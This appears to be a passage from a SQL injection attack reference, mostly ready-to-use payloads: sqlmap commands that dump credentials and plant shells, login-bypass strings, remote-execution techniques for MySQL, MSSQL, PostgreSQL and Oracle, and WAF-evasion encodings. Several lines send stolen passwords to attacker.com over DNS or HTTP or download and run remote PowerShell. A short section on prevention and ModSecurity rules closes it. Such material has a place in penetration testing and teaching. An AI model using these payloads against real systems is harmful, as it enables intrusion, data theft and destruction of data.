### Advanced SQLMap Scenarios

```bash
# Authentication bypass and session handling
sqlmap -u "http://target.com/index.php?id=1" \
  --cookie="PHPSESSID=abc123" --user-agent="Mozilla/5.0"

# Safe URL for regular requests (avoids DoS)
sqlmap -u "http://target.com/index.php?id=1" \
  --safe-url="http://target.com/index.php" --safe-freq=3

# Proxy through Burp for analysis
sqlmap -u "http://target.com/index.php?id=1" \
  --proxy="http://127.0.0.1:8080"

# Extract specific columns
sqlmap -u "http://target.com/index.php?id=1" \
  -D dbname -T users -C "username,password,email" --dump

# Search for specific data across all tables
sqlmap -u "http://target.com/index.php?id=1" \
  --search -C "password,passwd,credit_card"

# OS shell access (MySQL/MSSQL)
sqlmap -u "http://target.com/index.php?id=1" \
  --os-shell

# File system access
sqlmap -u "http://target.com/index.php?id=1" \
  --file-read="/etc/passwd" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"

# SQL shell for manual queries
sqlmap -u "http://target.com/index.php?id=1" \
  --sql-shell

# Tamper script suggester (use external tool Atlas)
# https://github.com/m4ll0k/Atlas
```

### Real-World SQLMap Example: Cronos HTB (2019)

During the HackTheBox machine "Cronos", SQLMap was used to compromise the admin panel:

```bash
# Initial detection with form scanning
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch

# Database enumeration
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dbs

# Table enumeration in 'admin' database
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --tables -D admin

# Column enumeration in 'users' table
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin

# Data extraction
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin
```

The extracted credentials provided admin panel access, leading to command injection and eventual root compromise.

---

## Authentication Bypass Techniques

### Classic Login Bypass

```sql
-- Always true condition
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1 AND '1'='1
' OR '1'='1'-- -
' OR '1'='1'/*
' OR '1'='1'#

-- No password required
admin'--
admin'-- -
admin'#
admin'/*
admin' OR 1=1--
admin' OR 1=1#
admin' OR 1=1/*
admin') OR '1'='1
admin') OR ('1'='1
admin' OR '1'='1'-- -

-- Bypass with comment
' UNION SELECT 1,2,3--
' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'--

-- Bypass with stacked queries
'; DROP TABLE users; --
'; INSERT INTO users (username, password, admin) VALUES ('hacker','pass',1)--
```

### Real-World Authentication Bypass: vBulletin 5.x (CVE-2019-16759)

vBulletin 5.x had an authentication bypass that used SQL injection in the login process. The payload:

```http
POST /ajax/api/hook/getHookList HTTP/1.1
Host: target.com
Content-Type: application/json

{"hook":"','' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -"}
```

This returned the administrator session token, allowing complete forum takeover.

---

## Database-Specific Attack Vectors

### MySQL Specific

**User-Defined Functions (UDF) for RCE:**

```sql
-- Check for UDF capability
SELECT * FROM mysql.func;

-- Load UDF library (requires FILE privilege)
SELECT 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000... INTO DUMPFILE 'C:\\Windows\\System32\\udf.dll';

-- Create UDF function
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';

-- Execute system commands
SELECT sys_eval('whoami');
SELECT sys_eval('ipconfig');
SELECT sys_eval('net user hacker pass /add');
```

**MySQL Information Schema Exploitation:**

```sql
-- Find tables with credit card patterns
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%card%' OR column_name LIKE '%credit%';

-- Find password columns
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';

-- Find PII data
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name IN ('ssn','social','dob','birth','address','phone','email');

-- System schema access (MySQL 5.7+)
SELECT * FROM mysql.user;
SELECT * FROM mysql.db;
SELECT * FROM mysql.tables_priv;
```

### MSSQL Specific

**XP_CMDSHELL Exploitation:**

```sql
-- Enable xp_cmdshell (if disabled)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/rev.ps1'')"';

-- Silent command execution (no output)
DECLARE @cmd sysname; SET @cmd = 'ping attacker.com'; EXEC xp_cmdshell @cmd, no_output;
```

**MSSQL Linked Servers:**

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;

-- Execute query on linked server
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT @@version');

-- Execute commands via linked server (xp_cmdshell on remote)
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT * FROM OPENQUERY([LocalServer], ''EXEC xp_cmdshell ''''whoami'''''')');

-- Create linked server to attacker (if permissions allow)
EXEC sp_addlinkedserver 'AttackerServer', '', 'SQLOLEDB', 'attacker.com';
EXEC sp_addlinkedsrvlogin 'AttackerServer', 'false', NULL, 'sa', 'password';
```

**MSSQL CLR Assembly RCE:**

```sql
-- Enable CLR
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Create assembly from hex
CREATE ASSEMBLY CustomAssembly FROM 0x4D5A90000300000004000000FFFF0000... WITH PERMISSION_SET = UNSAFE;

-- Create stored procedure from assembly
CREATE PROCEDURE ExecCommand @cmd NVARCHAR(MAX) AS EXTERNAL NAME CustomAssembly.StoredProcedures.ExecuteCommand;

-- Execute
EXEC ExecCommand 'whoami';
```

### PostgreSQL Specific

**COPY TO/FROM PROGRAM RCE:**

```sql
-- Execute command and read output
CREATE TABLE cmd_output (output text);
COPY cmd_output FROM PROGRAM 'whoami';
SELECT * FROM cmd_output;

-- Write output to file
COPY (SELECT '<?php system($_GET[cmd]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';

-- One-liner for command execution
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;
```

**PostgreSQL Large Object Exploitation:**

```sql
-- Read files via lo_import
SELECT lo_import('/etc/passwd', 12345);
SELECT lo_get(12345);
SELECT lo_export(12345, '/tmp/out.txt');

-- Write files via lo_export
SELECT lo_from_bytea(0, decode('3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e', 'hex'));
SELECT lo_export(12345, '/var/www/html/shell.php');
```

**PostgreSQL dblink Exploitation:**

```sql
-- Install dblink extension
CREATE EXTENSION dblink;

-- DNS exfiltration via dblink
SELECT * FROM dblink('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com user=test dbname=test','SELECT 1') RETURNS (result int);

-- Connect to internal PostgreSQL servers
SELECT * FROM dblink('host=192.168.1.100 port=5432 user=postgres password=postgres dbname=postgres','SELECT version()') AS t1(ver text);
```

### Oracle Specific

**Oracle Java Stored Procedures RCE:**

```sql
-- Create Java source
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "ExecCommand" AS
import java.lang.Runtime;
public class ExecCommand {
    public static String exec(String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
        return "Executed: " + cmd;
    }
};

-- Create PL/SQL wrapper
CREATE OR REPLACE PROCEDURE EXEC_CMD(p_cmd VARCHAR2) AS
LANGUAGE JAVA NAME 'ExecCommand.exec(java.lang.String)';

-- Execute
EXEC EXEC_CMD('whoami > /tmp/out.txt');
```

**Oracle DBMS_SCHEDULER RCE:**

```sql
-- Create external job
BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name   => 'EXEC_JOB',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 3,
    auto_drop => FALSE);
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_JOB',1,'-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_JOB',2,'whoami > /tmp/oracle_out.txt');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_JOB',3,'');
  DBMS_SCHEDULER.ENABLE('EXEC_JOB');
END;
/
```

---

## WAF Bypass Techniques

### Character Encoding Bypass

```sql
-- Double URL encoding
%2527 -> ' (after decoding)
SELECT %2527 UNION %2520 SELECT %2520 1,2,3--

-- Unicode encoding
%u0027 -> '
%u02b9 -> '
%uff07 -> '

-- Hex encoding
0x73656c656374 -- 'select' as hex

-- Decimal encoding
CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116) -- 'select'

-- Octal encoding
\163\145\154\145\143\164 -- 'select'

-- UTF-32 encoding
%00%00%00%27 -> '
```

### Comment-Based Bypass

```sql
-- MySQL comments
/*!50000SELECT*/ * /*!50000FROM*/ users --
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--

-- Nested comments
/*!12345UNION/*/*/ /*!12345SELECT*/ 1,2,3--

-- Random comment insertion
SEL/*foo*/ECT * FROM/*bar*/users

-- Versioned comments (MySQL)
/*!50000SELECT*/ * FROM users
/*!50500SELECT*/ * FROM users

-- Conditional comments (MSSQL)
SELECT /*!50000 1/0 */ -- Only executes on MySQL 5.0+
```

### Space Bypass Techniques

```sql
-- Alternative whitespace
SELECT%09*%09FROM%09users  -- Tab
SELECT%0a*%0aFROM%0ausers  -- Newline
SELECT%0b*%0bFROM%0busuers -- Vertical tab
SELECT%0c*%0cFROM%0cusuers -- Form feed
SELECT%0d*%0dFROM%0dusers  -- Carriage return
SELECT%A0*%A0FROM%A0users  -- Non-breaking space

-- Parentheses for space substitution
SELECT(id)FROM(users)WHERE(id=1)
SELECT(id)FROM(users)WHERE(id=1)UNION(SELECT(1),(2),(3))

-- Backticks (MySQL)
SELECT`id`FROM`users`

-- Braces (PostgreSQL)
SELECT {id} FROM {users}

-- Comments as spaces
SELECT/**/*/**/FROM/**/users
SELECT/*!*/1/*!*/UNION/*!*/SELECT/*!*/2,3,4
```

### Keyword Bypass

```sql
-- Case variation
SeLeCt * FrOm UsErS
sElEcT * fRoM uSeRs

-- Keyword splitting (some WAFs)
SEL<foo>ECT * FROM users
SE<SCRIPT>LECT</SCRIPT> * FROM users

-- Double keywords (some WAFs remove one)
SELSELECTECT * FROM users
UNION UNION SELECT SELECT 1,2,3

-- Null byte injection (older WAFs)
SELECT%00 * FROM users
%00UNION%00SELECT%001,2,3

-- Line continuation (MSSQL)
SEL--\nECT * FROM users

-- URL encoded line continuation
SEL%0AECT * FROM users
```

### Advanced WAF Bypass Example: ModSecurity

ModSecurity can be bypassed using charset confusion and overlong UTF-8:

```sql
-- Overlong UTF-8 encoding for single quote
%c0%27 -> ' (after decoding in some parsers)
%c0%af -> /
%c0%bc -> <

-- Combined techniques for ModSecurity 2.x
/*!50000%55%6e%69%6f%6e*/ /*!50000%53%65%6c%65%63%74*/ 1,2,3--
```

---

## Data Exfiltration Techniques

### Slow Bit-by-Bit Extraction

When time-based is the only option, extract data one bit at a time:

```sql
-- MySQL: Extract bit by bit
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 1, SLEEP(1), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 2, SLEEP(1), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 4, SLEEP(1), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 8, SLEEP(1), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 16, SLEEP(1), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 32, SLEEP(1), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 64, SLEEP(1), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 128, SLEEP(1), 0)--

-- PostgreSQL: Bit extraction with CASE
' OR CASE WHEN (ascii(substr((SELECT password FROM users LIMIT 1),1,1)) & 1) THEN pg_sleep(1) ELSE pg_sleep(0) END=1--
```

### DNS Tunneling for Data Extraction

```sql
-- MSSQL: Extract long data using multiple DNS queries
'; DECLARE @data varchar(max), @offset int, @chunk varchar(255); 
SET @data = (SELECT password FROM users WHERE username='admin'); 
SET @offset = 1; 
WHILE @offset <= LEN(@data) 
BEGIN 
    SET @chunk = SUBSTRING(@data, @offset, 30); 
    exec('master..xp_dirtree "//'+@chunk+'.' + CAST(@offset as varchar) + '.attacker.com/a"'); 
    SET @offset = @offset + 30; 
END--

-- Oracle: DNS tunneling with UTL_INADDR
DECLARE
    v_data VARCHAR2(4000);
    v_chunk VARCHAR2(60);
    v_offset NUMBER := 1;
BEGIN
    SELECT password INTO v_data FROM users WHERE username='administrator';
    WHILE v_offset <= LENGTH(v_data) LOOP
        v_chunk := SUBSTR(v_data, v_offset, 60);
        SYS.DBMS_LDAP.OPEN(v_chunk || '.' || v_offset || '.attacker.com', 80);
        v_offset := v_offset + 60;
    END LOOP;
END;
/
```

### HTTP Exfiltration

```sql
-- MSSQL: HTTP request via OLE Automation
'; DECLARE @url varchar(8000), @data varchar(4000); 
SET @data = (SELECT username+':'+password FROM users WHERE id=1); 
SET @url = 'http://attacker.com/collect?data=' + @data; 
DECLARE @obj int; 
EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1', @obj OUT; 
EXEC sp_OAMethod @obj, 'Open', NULL, 'GET', @url, 'false'; 
EXEC sp_OAMethod @obj, 'Send'; 
EXEC sp_OADestroy @obj--

-- Oracle: HTTP via UTL_HTTP
DECLARE
    v_data VARCHAR2(4000);
    v_req UTL_HTTP.REQ;
BEGIN
    SELECT password INTO v_data FROM users WHERE username='administrator';
    v_req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/' || v_data);
    UTL_HTTP.END_REQUEST(v_req);
END;
/

-- PostgreSQL: HTTP via dblink or COPY
'; CREATE TEMP TABLE http_out(data text); 
INSERT INTO http_out VALUES ((SELECT password FROM users LIMIT 1)); 
COPY http_out TO PROGRAM 'curl -X POST --data-binary @- http://attacker.com/collect'--
```

---

## Prevention & Mitigation

### Parameterized Queries (Prepared Statements)

**Java - JDBC:**
```java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = connection.prepareStatement(query);
ps.setString(1, username);
ps.setString(2, password);
ResultSet rs = ps.executeQuery();
```

**C# - ADO.NET:**
```csharp
string query = "SELECT * FROM users WHERE username = @username AND password = @password";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@username", username);
cmd.Parameters.AddWithValue("@password", password);
SqlDataReader reader = cmd.ExecuteReader();
```

**Python - SQLite/MySQL:**
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

**PHP - PDO:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);
```

### Input Validation

```php
// Whitelist validation for expected formats
if (!ctype_alnum($username) || strlen($username) > 20) {
    die("Invalid username format");
}

// Type casting for numeric parameters
$id = (int)$_GET['id'];

// Length limits
if (strlen($input) > 100) {
    die("Input too long");
}
```

### Principle of Least Privilege

```sql
-- Create application user with minimal privileges
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON app_database.* TO 'webapp'@'localhost';
-- NO FILE, NO CREATE, NO DROP, NO ALTER, NO EXECUTE

-- Disable dangerous functions
-- MySQL: secure_file_priv = /restricted/path
-- MSSQL: Disable xp_cmdshell, CLR, OLE Automation
-- PostgreSQL: Restrict COPY PROGRAM, dblink
-- Oracle: Remove PUBLIC execute on UTL_*, DBMS_*
```

### Web Application Firewall (WAF) Rules

```apache
# ModSecurity rule example
SecRule ARGS "@detectSQLi" "id:1001,deny,status:403,msg:'SQL Injection Detected'"

# Specific rule for UNION detection
SecRule ARGS "UNION.*SELECT" "id:1002,deny,status:403"

# Time-based detection
SecRule ARGS "SLEEP\([0-9]+\)|WAITFOR DELAY|pg_sleep" "id:1003,deny,status:403"
```

---

## Related Topics

- **Command Injection** - OS command execution through application inputs
- **NoSQL Injection** - MongoDB, CouchDB injection attacks and defenses
- **Web Exploits** - SQL injection to remote code execution attack chains
- **API Security** - REST and GraphQL API-specific injection vectors
- **WAF Bypass** - Advanced techniques for bypassing web application firewalls
- **LDAP Injection** - Authentication bypass and data extraction from LDAP directories
- **XPath Injection** - XML database query manipulation
- **ORM Injection** - Bypassing Object-Relational Mapping frameworks
